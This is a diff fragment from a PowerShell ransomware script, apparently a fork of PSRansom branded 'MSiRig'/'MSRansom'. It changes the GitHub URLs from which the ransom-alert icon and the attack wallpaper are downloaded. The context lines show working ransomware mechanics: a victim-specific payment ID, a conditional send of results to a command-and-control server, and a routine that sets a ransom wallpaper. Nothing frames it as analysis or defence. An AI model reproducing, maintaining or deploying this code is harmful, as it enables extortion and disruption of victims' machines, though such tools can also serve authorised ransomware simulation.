@@ -313,7 +313,7 @@ $form.Text = "MSiRig Ransomware Alert"
 
 
 # Download and set form icon
- $formIconUrl = "https://raw.githubusercontent.com/JoelGMSec/PSRansom/main/Demo/PSRansom.ico"
+ $formIconUrl = "https://raw.githubusercontent.com/IAMinZoho/MSRansom/refs/heads/main/PSRansom.ico"
  $iconTempPath = Join-Path $env:TEMP "psransom_$script:UniquePaymentID.ico"
  Try {
         Invoke-WebRequest -Uri $formIconUrl -OutFile $iconTempPath -ErrorAction Stop
@@ -638,7 +638,7 @@ else {
     if ($C2Status) { SendResults }
 
     # Call the wallpaper function
-    $wallpaperUrl = "https://raw.githubusercontent.com/IAMinZoho/PSRansom/refs/heads/main/Attack_Wallpaper.jpg"
+    $wallpaperUrl = "https://raw.githubusercontent.com/IAMinZoho/MSRansom/refs/heads/main/Attack_Wallpaper.jpg"
     $wallpaperTempPath = Join-Path $env:TEMP "ransom_wallpaper_$script:UniquePaymentID.jpg"
     Set-RansomWallpaper -WallpaperUrl $wallpaperUrl -DestinationPath $wallpaperTempPath
 
